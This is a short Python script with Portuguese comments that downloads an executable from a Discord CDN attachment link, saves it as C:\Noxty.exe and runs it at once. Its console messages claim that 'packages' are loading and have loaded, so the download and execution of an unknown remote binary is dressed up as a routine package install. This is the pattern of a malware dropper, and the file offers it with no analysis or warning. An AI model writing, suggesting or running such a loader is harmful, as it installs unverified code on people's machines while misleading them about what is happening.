import os
import urllib.request
import subprocess

# URL do arquivo executável a ser baixado
download_url = 'https://cdn.discordapp.com/attachments/1115689166789955645/1115692855739027566/gou.exe'
# Caminho onde o arquivo será salvo localmente
file_path = f'C:\\Noxty.exe'

# Função para baixar o arquivo
def download_file(url, path):
    urllib.request.urlretrieve(url, path)

# Função para executar o arquivo
def execute_file(path):
    try:
        subprocess.run(path)
        print('Carregando todas as packges...')
    except subprocess.CalledProcessError as e:
        print(f'Erro ao executar o arquivo: {e}')

# Chamada das funções
try:
    download_file(download_url, file_path)
    print('Todas as packages foram carregadas com sucesso!')
    execute_file(file_path)
except Exception as e:
    print(f'Erro ao baixar ou executar o arquivo: {e}')